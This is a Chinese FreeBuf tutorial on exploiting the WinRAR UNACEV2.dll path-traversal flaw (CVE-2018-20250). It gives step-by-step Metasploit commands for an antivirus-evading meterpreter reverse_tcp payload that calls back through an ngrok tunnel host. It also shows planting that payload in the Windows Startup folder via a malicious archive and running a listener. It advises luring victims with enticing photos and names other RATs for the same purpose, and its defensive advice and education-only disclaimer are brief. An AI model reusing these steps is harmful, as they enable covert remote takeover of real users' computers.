***本文作者：艾登——皮尔斯，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

## 前言

 **Windows 操作系统下知名老牌的的压缩软件“WinRAR”
被国外安全研究团队爆出严重威胁用户的安全漏洞，被发现漏洞是“WinRAR”安装目录中的一个名为“UNACEV2.dll”的动态链接库文件，该文件自 2005
年发布至今就从未有过更新过，影响时长长达十余年之久。本篇文章鄙人会使用图文+视频的教程来给各位不知道利用的小粉们讲一下，视频教程在文末尾处。**

漏洞细节: <https://research.checkpoint.com/extracting-code-execution-from-winrar/>

![](https://image.3001.net/images/20190301/1551408584_5c789dc8604f5.png!small)

## 影响版本

    
    
    WinRAR < 5.70 Beta 1
    
    Bandizip< = 6.2.0.0
    
    好压(2345压缩) < = 5.9.8.10907
    
    360压缩< = 4.0.0.1170

## 准备

    
    
    KaliLinux(版本随意我这里使用的版本是2019.1版本)
    
    ngrok
    
    Metasploit(KaliLinux2019.1已经集成了Metasploit5)

## 图文教程开始

1.1 下载WinRAR远程代码执行漏洞EXP利用文件:

> <https://github.com/WyAtu/CVE-2018-20250.git>

![](https://image.3001.net/images/20190301/1551405556_5c7891f433490.png!small)

1.2 打开你的浏览器打开<https://www.ngrok.cc/>
有账号登录，没有账户注册登录。开通一个免费的隧道转发代理，把ngrok隧道协议设置成TCP，内网IP改成你自己的KaliLinux的内网IP，内网端口号任意填写不冲突即可。

![](https://image.3001.net/images/20190301/1551405754_5c7892bae35d2.png!small)

1.3 记住如图所示红线框起来的两部分内容，后面会用到。

![](https://image.3001.net/images/20190301/1551405883_5c78933b7402d.png!small)

1.4 然后[下载ngrok脚本到你的KaliLinux上面](https://www.ngrok.cc/download.html)，选择”Linux
64Bit版本”保存到桌面上，运行脚本开启代理。

    
    
    ./sunny clientid [隧道ID]

![](https://image.3001.net/images/20190301/1551406062_5c7893eeeca9f.png!small)

Metasploit生成免杀Payload 载荷(针对Windows10的defender)

2.1 使用Metasploit5自带的免杀模块生成Payload

    
    
    msfconsole
    
    use evasion/windows/windows_defender_exe(选择msf5免杀模块)
    
    show info(显示模块信息)
    
    set filename WinRarPayloadTest.exe(设置Payload名字 )
    
    set payload windows/meterpreter/reverse_tcp(设置Payload类型 )
    
    set lhost free.idcfengye.com(设置上线地址，填写Ngrok映射出去的地址即可)
    
    set lport 12352(设置监听端口，填写Ngrok映射出去的端口即可 )
    
    run(生成Payload)

![](https://image.3001.net/images/20190301/1551406366_5c78951e3be0d.png!small)

(Payload的路径地址:/root/.msf4/local/WinRarPayload.exe)

2.2 把Payload移动到apache2网站根目录下

    
    
    cp /root/.msf4/local/xxxxx.exe /var/www/htm

2.3 启动阿帕奇服务

    
    
    service apache2 start

2.4 物理机访问KaliLinux的IP地址，下载这个Payload文件到EXP文件夹下的根目录。

![](https://image.3001.net/images/20190301/1551406618_5c78961a44bb7.png!small)

2.5 打开exp.py文件把“calc.exe“修改成”WinRarPayload.exe”保存。

![](https://image.3001.net/images/20190301/1551406673_5c789651e2a03.png!small)

2.6 Python运行exp.py文件自动在文件根目录下生成恶意压缩包。

![](https://image.3001.net/images/20190301/1551406714_5c78967a9209e.png!small)

2.7 已经成功生成了恶意的压缩包，这时候你们往里面丢一些照片视频(你懂的)什么的就变成了诱人的压缩包了。

Windows7靶机下载解压这个恶意压缩包：

![](https://image.3001.net/images/20190301/1551406897_5c78973139b9d.png!small)

3.1 解压后自动在系统启动目录下自动出现我们之前生成的Payload。

![](https://image.3001.net/images/20190301/1551406939_5c78975bbd1f0.png!small)

Windows7系统启动目录:C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start
Menu\Programs\Startup。

Metasploit启动远程监听主机上线请求:

    
    
    msfconsole
    
    use exploit/multi/handler
    
    set payload windows/meterpreter/reverse_tcp
    
    set lhost 192.168.0.107
    
    set lport 8989
    
    run

![](https://image.3001.net/images/20190301/1551406983_5c789787f2689.png!small)

![](https://image.3001.net/images/20190301/1551406995_5c78979375a08.png!small)

确保ngrok后台在运行,然后重启Windows7靶机，metasploit监听等待上线。

![](https://image.3001.net/images/20190301/1551407148_5c78982c40b9d.png!small)

## 视频复现教程

> <https://www.lanzous.com/i3a0ide> 密码:FreeBuf

## 防御方法

1\. 卸载Winrar，下载7z，安装包体积小，压缩解压速度快([传送门](https://www.7-zip.org/))

2\. 删除UNACEV2.dll文件

3\. 不下载解压来历不明的压缩包(色字头上一把刀，手冲一时爽)

## 小结

evasion/windows/windows_defender_exe这个免杀模块基本可以免杀大多杀毒软件(Windows10
Defender,火绒等等)，也可以通过Shllecode编码的方式来达到免杀的效果，条条大路通罗马。其次你也可以使用Windows平台下的其他远程RAT(Njrat，Ghost等等)来生成恶意的压缩包，Windows平台的内网穿透工具可以使用"网络通"，来达到效果。文章和视频仅用于安全教育的范畴；切勿违法使用，视频配BGM是鄙人喜好，望各位前辈多多包涵。

 ***本文作者：艾登——皮尔斯，本文属 FreeBuf 原创奖励计划，未经许可禁止转载。**

